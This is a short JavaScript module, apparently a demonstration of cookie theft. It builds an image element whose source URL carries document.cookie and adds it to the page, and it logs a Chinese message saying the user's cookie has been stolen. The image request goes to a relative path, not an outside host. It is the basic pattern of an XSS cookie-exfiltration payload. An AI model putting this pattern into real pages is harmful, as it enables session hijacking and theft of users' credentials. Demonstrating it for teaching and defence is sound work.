
export default ()=>{
 const img = document.createElement('img');
    img.src="cookie=>" + document.cookie;
    console.log(img.src,'你的cookie被偷了');
    document.body.appendChild(img);
}
